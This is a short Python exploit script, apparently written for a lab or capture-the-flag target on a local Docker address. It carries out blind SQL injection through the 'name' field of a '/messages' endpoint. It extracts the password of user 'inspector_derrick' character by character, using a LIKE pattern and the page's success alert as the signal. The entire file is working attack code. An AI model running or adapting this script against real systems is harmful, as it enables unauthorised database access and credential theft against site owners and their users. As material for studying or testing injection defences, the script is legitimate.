import sys
import requests
from bs4 import BeautifulSoup
import itertools 

addr = "172.17.0.2" if len(sys.argv) > 1 else "127.0.0.1"
request="' or (select length(name) from users where name = 'inspector_derrick' and password LIKE '%') > 0 --'"
password = ""
found = True

while(found):    
    found = False
    for i in itertools.chain(range(48, 65), range(97, 126)):  
        injection = requests.post('http://' + addr + '/messages', {'name': request[:len(request)-11] + chr(i) + request[len(request)-11:]})
        s=BeautifulSoup(injection.text)
        result = s.findAll(attrs = {'class' : 'alert alert-success'})
        if len(result) !=0 :
            found = True
            password+=chr(i)
            break; 
    if (found):
        request = request[:len(request)-11] + "_" + request[len(request)-11:]
sys.stdout.write(password)

